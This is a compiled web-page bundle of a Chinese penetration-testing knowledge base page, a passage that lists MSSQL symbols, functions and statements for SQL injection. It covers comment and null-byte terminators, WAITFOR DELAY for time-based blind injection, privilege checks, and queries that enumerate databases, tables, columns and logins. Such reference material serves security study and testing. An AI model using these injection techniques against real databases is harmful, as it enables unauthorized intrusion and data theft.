"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[2908],{28453:(e,s,r)=>{r.d(s,{R:()=>c,x:()=>i});var d=r(96540);const n={},t=d.createContext(n);function c(e){const s=d.useContext(t);return d.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function i(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:c(e.components),d.createElement(t.Provider,{value:s},e.children)}},60214:(e,s,r)=>{r.r(s),r.d(s,{assets:()=>l,contentTitle:()=>i,default:()=>j,frontMatter:()=>c,metadata:()=>d,toc:()=>x});const d=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL/\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b","title":"\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b","description":"\u5e38\u7528\u7b26\u53f7","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/04.MSSQL/01.\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/04.MSSQL","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL/\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL/\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"MSSQL","permalink":"/docs/category/mssql"},"next":{"title":"\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5"}}');var n=r(74848),t=r(28453);const c={},i=void 0,l={},x=[{value:"\u5e38\u7528\u7b26\u53f7",id:"\u5e38\u7528\u7b26\u53f7",level:2},{value:"\u6ce8\u91ca\u7b26",id:"\u6ce8\u91ca\u7b26",level:3},{value:"\u8fd0\u7b97\u7b26",id:"\u8fd0\u7b97\u7b26",level:3},{value:"\u5168\u5c40\u53d8\u91cf",id:"\u5168\u5c40\u53d8\u91cf",level:3},{value:"\u5e38\u89c1\u51fd\u6570",id:"\u5e38\u89c1\u51fd\u6570",level:2},{value:"\u6570\u636e\u5e93\u4fe1\u606f",id:"\u6570\u636e\u5e93\u4fe1\u606f",level:3},{value:"\u6570\u636e\u7c7b\u578b\u8f6c\u6362",id:"\u6570\u636e\u7c7b\u578b\u8f6c\u6362",level:3},{value:"\u5b57\u7b26\u4e32\u64cd\u4f5c\u51fd\u6570",id:"\u5b57\u7b26\u4e32\u64cd\u4f5c\u51fd\u6570",level:3},{value:"\u5b57\u7b26\u4e32\u62fc\u63a5",id:"\u5b57\u7b26\u4e32\u62fc\u63a5",level:3},{value:"\u6761\u4ef6\u51fd\u6570",id:"\u6761\u4ef6\u51fd\u6570",level:3},{value:"\u5ef6\u65f6\u51fd\u6570",id:"\u5ef6\u65f6\u51fd\u6570",level:3},{value:"\u5176\u4ed6\u51fd\u6570/\u8bed\u53e5",id:"\u5176\u4ed6\u51fd\u6570\u8bed\u53e5",level:3},{value:"\u5e38\u7528\u8bed\u53e5",id:"\u5e38\u7528\u8bed\u53e5",level:2}];function h(e){const s={a:"a",code:"code",h2:"h2",h3:"h3",p:"p",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,t.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(s.h2,{id:"\u5e38\u7528\u7b26\u53f7",children:"\u5e38\u7528\u7b26\u53f7"}),"\n",(0,n.jsx)(s.h3,{id:"\u6ce8\u91ca\u7b26",children:"\u6ce8\u91ca\u7b26"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u6ce8\u91ca\u7b26"})}),(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u91ca\u4e49"})})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsxs)(s.td,{children:[(0,n.jsx)(s.code,{children:" -- -"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"+--+"})]}),(0,n.jsx)(s.td,{children:"SQL\u6ce8\u91ca\u98ce\u683c"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:";%00"})}),(0,n.jsx)(s.td,{children:"\u7a7a\u5b57\u8282"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"/*...*/"})}),(0,n.jsx)(s.td,{children:"C\u6ce8\u91ca\u98ce\u683c"})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u8fd0\u7b97\u7b26",children:"\u8fd0\u7b97\u7b26"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u8fd0\u7b97\u7b26"})}),(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u91ca\u4e49"})})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"+"}),(0,n.jsx)(s.td,{children:"\u52a0\u6cd5\u8fd0\u7b97"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"-"}),(0,n.jsx)(s.td,{children:"\u51cf\u6cd5\u8fd0\u7b97"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"*"}),(0,n.jsx)(s.td,{children:"\u4e58\u6cd5\u8fd0\u7b97"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"/"}),(0,n.jsx)(s.td,{children:"\u9664\u6cd5\u8fd0\u7b97\uff0c\u5982\u679c\u4e24\u4e2a\u8868\u8fbe\u5f0f\u503c\u90fd\u662f\u6574\u6570\uff0c\u90a3\u4e48\u7ed3\u679c\u53ea\u53d6\u6574\u6570\u503c\uff0c\u5c0f\u6570\u503c\u5c06\u7565\u53bb"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"%"}),(0,n.jsx)(s.td,{children:"\u53d6\u6a21\u8fd0\u7b97\uff0c\u8fd4\u56de\u4e24\u6570\u76f8\u9664\u540e\u7684\u4f59\u6570"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"&"}),(0,n.jsx)(s.td,{children:"\u4f4d\u4e0e\u903b\u8f91\u8fd0\u7b97"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\uff5c"}),(0,n.jsx)(s.td,{children:"\u4f4d\u6216\u903b\u8f91\u8fd0\u7b97"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"^"}),(0,n.jsx)(s.td,{children:"\u4f4d\u5f02\u6216\u8fd0\u7b97"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"="}),(0,n.jsx)(s.td,{children:"\u7b49\u4e8e"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsxs)(s.td,{children:[(0,n.jsx)(s.code,{children:"<>"})," !="]}),(0,n.jsx)(s.td,{children:"\u4e0d\u7b49\u4e8e"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"<"})}),(0,n.jsx)(s.td,{children:"\u5c0f\u4e8e"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:">"}),(0,n.jsx)(s.td,{children:"\u5927\u4e8e"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"!<"})}),(0,n.jsx)(s.td,{children:"\u4e0d\u5c0f\u4e8e"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"<="})}),(0,n.jsx)(s.td,{children:"\u5c0f\u4e8e\u7b49\u4e8e"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"..."}),(0,n.jsx)(s.td,{children:"..."})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u5168\u5c40\u53d8\u91cf",children:"\u5168\u5c40\u53d8\u91cf"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u53d8\u91cf"})}),(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u91ca\u4e49"})})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"@@VERSION"}),(0,n.jsx)(s.td,{children:"SQL Server \u7248\u672c"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"@@SEVERNAME"}),(0,n.jsx)(s.td,{children:"\u8fd0\u884cSQL Server \u7684\u672c\u5730\u670d\u52a1\u5668\u540d\u79f0"})]})]})]}),"\n",(0,n.jsx)(s.h2,{id:"\u5e38\u89c1\u51fd\u6570",children:"\u5e38\u89c1\u51fd\u6570"}),"\n",(0,n.jsx)(s.h3,{id:"\u6570\u636e\u5e93\u4fe1\u606f",children:"\u6570\u636e\u5e93\u4fe1\u606f"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u51fd\u6570"})}),(0,n.jsx)(s.th,{children:(0,n.jsx)(s.strong,{children:"\u91ca\u4e49"})})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsxs)(s.td,{children:["DB_NAME()",(0,n.jsx)("br",{}),"DB_NAME(n)"]}),(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u540d\uff0c\u6709n\u5219\u83b7\u53d6\u5176\u4ed6\u6570\u636e\u5e93\u540d\uff0cn\u4e3a\u6570\u5b571\u30012\u30013..."})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsxs)(s.td,{children:["USER_NAME()",(0,n.jsx)("br",{}),"USER",(0,n.jsx)("br",{}),"system_user",(0,n.jsx)("br",{}),"current_user"]}),(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u7528\u6237\u5728\u6570\u636e\u5e93\u4e2d\u7684\u540d\u5b57"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsxs)(s.td,{children:["is_srvrolemember('sysadmin')",(0,n.jsx)("br",{}),"is_srvrolemember('db_owner')",(0,n.jsx)("br",{}),"is_srvrolemember('public')"]}),(0,n.jsx)(s.td,{children:"\u5224\u65ad\u5f53\u524d\u7528\u6237\u6743\u9650"})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u6570\u636e\u7c7b\u578b\u8f6c\u6362",children:"\u6570\u636e\u7c7b\u578b\u8f6c\u6362"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u51fd\u6570"}),(0,n.jsx)(s.th,{children:"\u91ca\u4e49"})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"ASCII(str)"}),(0,n.jsx)(s.td,{children:"\u8fd4\u56de\u5b57\u7b26\u8868\u8fbe\u5f0f\u6700\u5de6\u7aef\u5b57\u7b26\u7684ASCII \u7801\u503c"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"CHAR(str)"}),(0,n.jsx)(s.td,{children:"\u5c06ASCII \u7801\u8f6c\u6362\u4e3a\u5b57\u7b26"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"cast(16 as VARBINARY(50))"}),(0,n.jsx)(s.td,{children:"\u5c0616\u8f6c\u6362\u4e3a16\u8fdb\u5236"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"CONVERT(VARBINARY(50),16)"}),(0,n.jsx)(s.td,{children:"\u5c0616\u8f6c\u6362\u4e3a16\u8fdb\u5236"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"master.dbo.fn_varbintohexstr(16)"}),(0,n.jsx)(s.td,{children:"\u5c0616\u8f6c\u6362\u4e3a16\u8fdb\u5236"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"STR(n)"}),(0,n.jsx)(s.td,{children:"\u5c06\u6570\u503c\u578b\u6570\u636e\u8f6c\u4e3a\u5b57\u7b26\u578b\u6570\u636e"})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u5b57\u7b26\u4e32\u64cd\u4f5c\u51fd\u6570",children:"\u5b57\u7b26\u4e32\u64cd\u4f5c\u51fd\u6570"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u51fd\u6570"}),(0,n.jsx)(s.th,{children:"\u91ca\u4e49"})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"SUBSTRING (<expression>\uff0c <starting_ position>\uff0c length)"})}),(0,n.jsxs)(s.td,{children:["\u8fd4\u56de\u4ece\u5b57\u7b26\u4e32\u5de6\u8fb9\u7b2c",(0,n.jsx)(s.code,{children:"starting_position"}),"\u4e2a\u5b57\u7b26\u8d77\u5207\u5272length\u4e2a\u5b57\u7b26"]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"LEFT (<character_expression>\uff0c <integer_expression>)"})}),(0,n.jsxs)(s.td,{children:["\u8fd4\u56de",(0,n.jsx)(s.code,{children:"character_expression"})," \u5de6\u8d77 ",(0,n.jsx)(s.code,{children:"integer_expression"})," \u4e2a\u5b57\u7b26"]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"RIGHT (<character_expression>\uff0c <integer_expression>)"})}),(0,n.jsxs)(s.td,{children:["\u8fd4\u56de",(0,n.jsx)(s.code,{children:"character_expression"})," \u53f3\u8d77 ",(0,n.jsx)(s.code,{children:"integer_expression"})," \u4e2a\u5b57\u7b26"]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"QUOTENAME (<\u2019character_expression\u2019>[\uff0c quote_ character])"})}),(0,n.jsx)(s.td,{children:"\u8fd4\u56de\u88ab\u7279\u5b9a\u5b57\u7b26\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"REPLICATE (character_expression,integer_expression)"})}),(0,n.jsxs)(s.td,{children:["\u8fd4\u56de\u4e00\u4e2a\u91cd\u590d ",(0,n.jsx)(s.code,{children:"character_expression"})," \u6307\u5b9a\u6b21\u6570\u7684\u5b57\u7b26\u4e32"]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"REVERSE (<character_expression>)"})}),(0,n.jsx)(s.td,{children:"\u5c06\u6307\u5b9a\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u6392\u5217\u987a\u5e8f\u98a0\u5012"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"REPLACE (<string_expression1>\uff0c <string_expression2>\uff0c <string_expression3>)"})}),(0,n.jsxs)(s.td,{children:["\u7528",(0,n.jsx)(s.code,{children:"string_expression3"})," \u66ff\u6362\u5728",(0,n.jsx)(s.code,{children:"string_expression1"})," \u4e2d\u7684\u5b50\u4e32",(0,n.jsx)(s.code,{children:"string_expression2"})]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"SPACE (<integer_expression>)"})}),(0,n.jsx)(s.td,{children:"\u8fd4\u56de\u4e00\u4e2a\u6709\u6307\u5b9a\u957f\u5ea6\u7684\u7a7a\u767d\u5b57\u7b26\u4e32"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"STUFF (<character_expression1>\uff0c <start_ position>\uff0c <length>\uff0c<character_expression2>)"})}),(0,n.jsx)(s.td,{children:"\u7528\u53e6\u4e00\u5b50\u4e32\u66ff\u6362\u5b57\u7b26\u4e32\u6307\u5b9a\u4f4d\u7f6e\u3001\u957f\u5ea6\u7684\u5b50\u4e32"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"CHARINDEX (<'substring_expression'>\uff0c <expression>)"})}),(0,n.jsxs)(s.td,{children:["\u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u67d0\u4e2a\u6307\u5b9a\u7684\u5b50\u4e32\u51fa\u73b0\u7684\u5f00\u59cb\u4f4d\u7f6e\u5176\u4e2d",(0,n.jsx)(s.code,{children:"substring_expression"})," \u662f\u6240\u8981\u67e5\u627e\u7684\u5b57\u7b26\u8868\u8fbe\u5f0f\uff0c",(0,n.jsx)(s.code,{children:"expression"})," \u53ef\u4e3a\u5b57\u7b26\u4e32\u4e5f\u53ef\u4e3a\u5217\u540d\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u6ca1\u6709\u53d1\u73b0\u5b50\u4e32\uff0c\u5219\u8fd4\u56de0 \u503c\u3002 \u6b64\u51fd\u6570\u4e0d\u80fd\u7528\u4e8eTEXT \u548cIMAGE \u6570\u636e\u7c7b\u578b\u3002"]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:(0,n.jsx)(s.code,{children:"PATINDEX (<\u2019%substring _expression%\u2019>\uff0c <column_ name>)"})}),(0,n.jsx)(s.td,{children:"\u5176\u4e2d\u5b50\u4e32\u8868\u8fbe\u5f0f\u524d\u540e\u5fc5\u987b\u6709\u767e\u5206\u53f7\u201c%\u201d\u5426\u5219\u8fd4\u56de\u503c\u4e3a0\u3002\u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u67d0\u4e2a\u6307\u5b9a\u7684\u5b50\u4e32\u51fa\u73b0\u7684\u5f00\u59cb\u4f4d\u7f6e\u3002\u4e0eCHARINDEX \u51fd\u6570\u4e0d\u540c\u7684\u662f\uff0cPATINDEX\u51fd\u6570\u7684\u5b50\u4e32\u4e2d\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u4e14\u6b64\u51fd\u6570\u53ef\u7528\u4e8eCHAR\u3001 VARCHAR \u548cTEXT \u6570\u636e\u7c7b\u578b\u3002"})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u5b57\u7b26\u4e32\u62fc\u63a5",children:"\u5b57\u7b26\u4e32\u62fc\u63a5"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u51fd\u6570/\u8bed\u53e5"}),(0,n.jsx)(s.th,{children:"\u91ca\u4e49"})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"CONCAT(text1, [text2],\u2026)"}),(0,n.jsx)(s.td,{children:"\u8fde\u63a5\u5b57\u7b26\u4e32\u51fd\u6570\uff0cMSSQL 2012+ \u652f\u6301"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"CONCAT_WS ( separator, argument1, argument2 [, argumentN]... )"}),(0,n.jsx)(s.td,{children:"\u8fde\u63a5\u5b57\u7b26\u4e32\u51fd\u6570\uff0cSQL Server 2017 (14.x) and later"})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u6761\u4ef6\u51fd\u6570",children:"\u6761\u4ef6\u51fd\u6570"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u51fd\u6570/\u8bed\u53e5"}),(0,n.jsx)(s.th,{children:"\u91ca\u4e49"})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"IF...ELSE..."}),(0,n.jsx)(s.td,{children:"\u6761\u4ef6\u8bed\u53e5"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"case when exp then state1 ELSE state2 end"}),(0,n.jsx)(s.td,{children:"\u6761\u4ef6\u8bed\u53e5"})]})]})]}),"\n",(0,n.jsx)(s.h3,{id:"\u5ef6\u65f6\u51fd\u6570",children:"\u5ef6\u65f6\u51fd\u6570"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u51fd\u6570/\u8bed\u53e5"}),(0,n.jsx)(s.th,{children:"\u91ca\u4e49"})]})}),(0,n.jsx)(s.tbody,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsxs)(s.td,{children:["WAITFOR DELAY '0:0",":n","'"]}),(0,n.jsx)(s.td,{children:"\u5ef6\u8fdfn s"})]})})]}),"\n",(0,n.jsx)(s.h3,{id:"\u5176\u4ed6\u51fd\u6570\u8bed\u53e5",children:"\u5176\u4ed6\u51fd\u6570/\u8bed\u53e5"}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u51fd\u6570/\u8bed\u53e5"}),(0,n.jsx)(s.th,{children:"\u91ca\u4e49"})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"LEN(str)"}),(0,n.jsx)(s.td,{children:"\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"LOWER(str)"}),(0,n.jsx)(s.td,{children:"\u5c06\u5b57\u7b26\u4e32\u7684\u5927\u5199\u5b57\u6bcd\u5168\u90e8\u8f6c\u6210\u5c0f\u5199"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"UPPER(str)"}),(0,n.jsx)(s.td,{children:"\u5c06\u5b57\u7b26\u4e32\u7684\u5c0f\u5199\u5b57\u6bcd\u5168\u90e8\u8f6c\u6210\u5927\u5199"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"LTRIM()"}),(0,n.jsx)(s.td,{children:"\u5b57\u7b26\u4e32\u5934\u90e8\u7684\u7a7a\u683c\u53bb\u6389"})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"RTRIM()"}),(0,n.jsx)(s.td,{children:"\u628a\u5b57\u7b26\u4e32\u5c3e\u90e8\u7684\u7a7a\u683c\u53bb\u6389"})]})]})]}),"\n",(0,n.jsx)(s.h2,{id:"\u5e38\u7528\u8bed\u53e5",children:"\u5e38\u7528\u8bed\u53e5"}),"\n",(0,n.jsxs)(s.p,{children:["\u66f4\u591a\u53c2\u8003\uff1a",(0,n.jsx)(s.a,{href:"https://bak.gm7.org/sqlwiki.netspi.com/attackQueries/informationGathering/index.html#sqlserver",children:"https://bak.gm7.org/sqlwiki.netspi.com/attackQueries/informationGathering/index.html#sqlserver"})]}),"\n",(0,n.jsxs)(s.table,{children:[(0,n.jsx)(s.thead,{children:(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.th,{children:"\u8bf4\u660e"}),(0,n.jsx)(s.th,{style:{textAlign:"left"},children:"\u8bed\u53e5"})]})}),(0,n.jsxs)(s.tbody,{children:[(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u67e5\u770b\u6570\u636e\u5e93\u6743\u9650"}),(0,n.jsxs)(s.td,{style:{textAlign:"left"},children:[(0,n.jsx)(s.code,{children:"select is_srvrolemember('sysadmin')"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select is_srvrolemember('db_owner')"}),(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select is_srvrolemember('public')"})]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f"}),(0,n.jsxs)(s.td,{style:{textAlign:"left"},children:["-- \u83b7\u53d6\u7248\u672c",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select @@version;"}),(0,n.jsx)("br",{}),"-- \u83b7\u53d6\u7528\u6237\u540d",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select user;"}),(0,n.jsx)("br",{}),"-- \u83b7\u53d6\u670d\u52a1\u5668\u4e3b\u673a\u540d",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select @@servername;"}),(0,n.jsx)("br",{}),"-- \u83b7\u53d6\u6240\u6709\u7528\u6237",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select name from master..syslogins"})]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u6570\u636e\u5e93"}),(0,n.jsxs)(s.td,{style:{textAlign:"left"},children:["-- \u5f53\u524d\u6570\u636e\u5e93",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select db_name();"}),(0,n.jsx)("br",{}),"-- \u5176\u4ed6\u6570\u636e\u5e93,n\u4e3anumber\u7c7b\u578b\uff0c1\u30012\u30013\u30014...",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select db_name(n);"}),(0,n.jsx)("br",{}),"-- \u5176\u4ed6\u6570\u636e\u5e93\uff0c\u4fee\u6539\u540e\u9762dbid\u4e3a 1 2 3 ",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select name from master.dbo.sysdatabases where dbid=1"}),(0,n.jsx)("br",{}),"-- \u6240\u6709\u6570\u636e\u5e93",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select name from master..sysdatabases;"})]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u8868"}),(0,n.jsxs)(s.td,{style:{textAlign:"left"},children:[(0,n.jsx)(s.code,{children:"select name from test..sysobjects where xtype = 'u'"}),(0,n.jsx)("br",{}),"-- \u7b2c\u4e00\u5f20\u8868",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select top 1 name from \u5e93\u540d.dbo.sysobjects where xtype='U'"}),(0,n.jsx)("br",{}),"-- \u7b2c\u4e8c\u5f20\u8868",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select top 1 name from \u5e93\u540d.dbo.sysobjects where xtype='U' and name not in('\u7b2c\u4e00\u5f20\u8868')"}),(0,n.jsx)("br",{}),"-- \u7b2c\u4e09\u5f20\u8868",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select top 1 name from \u5e93\u540d.dbo.sysobjects where xtype='U' and name not in(\u2018\u7b2c\u4e00\u5f20\u8868\u2019,\u2019\u7b2c\u4e8c\u5f20\u8868\u2019) "}),(0,n.jsx)("br",{}),"-- \u6216\u8005",(0,n.jsx)("br",{}),"-- \u6bcf\u4e2a\u5e93\u90fd\u6709information_schema\uff0c\u53ef\u4ee5\u4e0d\u7528\u52a0test\uff0c\u4e5f\u652f\u6301\u8de8\u5e93\u67e5\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u6837\u67e5\u8be2\u51fa\u6765\u4f7f\u7528\u89c6\u56fe\u7684",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select table_name from test.information_schema.tables"}),(0,n.jsx)("br",{}),"-- \u4ece\u5f53\u524d\u5e93\u83b7\u53d6\u8868\uff0c\u53bb\u9664\u89c6\u56fe",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select table_name from information_schema.tables where table_type not in ('view');"})]})]}),(0,n.jsxs)(s.tr,{children:[(0,n.jsx)(s.td,{children:"\u83b7\u53d6\u5217"}),(0,n.jsxs)(s.td,{style:{textAlign:"left"},children:[(0,n.jsx)(s.code,{children:"select name from test..syscolumns where id = (select id from test..sysobjects where name = 'users')"}),(0,n.jsx)("br",{}),"-- \u6216\u8005",(0,n.jsx)("br",{}),(0,n.jsx)(s.code,{children:"select column_name from test.information_schema.columns where table_name = 'users';"}),(0,n.jsx)("br",{}),"-- 